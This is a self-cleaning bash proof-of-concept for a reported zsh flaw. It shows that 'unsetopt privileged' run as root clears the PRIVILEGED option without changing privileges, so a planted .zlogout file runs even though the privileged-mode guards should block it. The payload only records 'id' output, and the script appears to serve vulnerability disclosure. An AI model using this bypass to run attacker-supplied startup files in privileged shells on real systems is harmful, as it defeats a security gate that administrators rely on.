#!/bin/bash
# Finding 2 PoC: PRIVILEGED is not sticky -- `unsetopt privileged` silently
# no-ops (zero actual privilege change) whenever real UID == effective UID
# == 0, yet it still clears opts[PRIVILEGED]. This defeats every gate keyed
# on unset(PRIVILEGED) -- including Apple's own 666e91a ".zlogout" fix --
# without ever touching the .zlogout-specific code at all.
#
# Must be run as root. Self-cleaning.
#
# Two runs for comparison:
#   SCENARIO A (control):  -p session, exits normally        -> .zlogout blocked
#   SCENARIO B (the bug):  -p session, runs `unsetopt privileged`
#                          (the exact idiom Doc/Zsh/options.yo recommends
#                          for privileged scripts), THEN exits            -> .zlogout fires
set -euo pipefail

ZSH_BIN="${1:-$(command -v zsh 2>/dev/null || echo /bin/zsh)}"
VICTIM_DIR=/tmp/finding2_poc_home
PROOF="$VICTIM_DIR/fired.txt"

cleanup() { rm -rf "$VICTIM_DIR"; }
trap cleanup EXIT

mkdir -p "$VICTIM_DIR"
cat > "$VICTIM_DIR/.zlogout" <<EOF
id >> $PROOF
echo "fired via .zlogout, euid=\$(id -u)" >> $PROOF
EOF
export ZDOTDIR="$VICTIM_DIR"
export HOME="$VICTIM_DIR"

run() {
    local label="$1" script="$2"
    rm -f "$PROOF"
    echo "=== $label ==="
    printf '%s' "$script" | "$ZSH_BIN" -p -l -i 2>&1 | tail -6
    if [ -f "$PROOF" ]; then
        echo "  RESULT: .zlogout FIRED -- $(cat "$PROOF")"
    else
        echo "  RESULT: .zlogout did not fire"
    fi
    echo
}

echo "[*] real/effective uid of this whole demo: $(id)"
echo

run "SCENARIO A (control): PRIVILEGED session, exits normally, no unsetopt" \
    'id
exit
'

run "SCENARIO B (the bug): PRIVILEGED session runs the documented 'unsetopt privileged' idiom, then exits" \
    'echo "before unsetopt:"; id
unsetopt privileged
echo "after unsetopt (should be IDENTICAL to above if this were a real privilege drop):"; id
exit
'
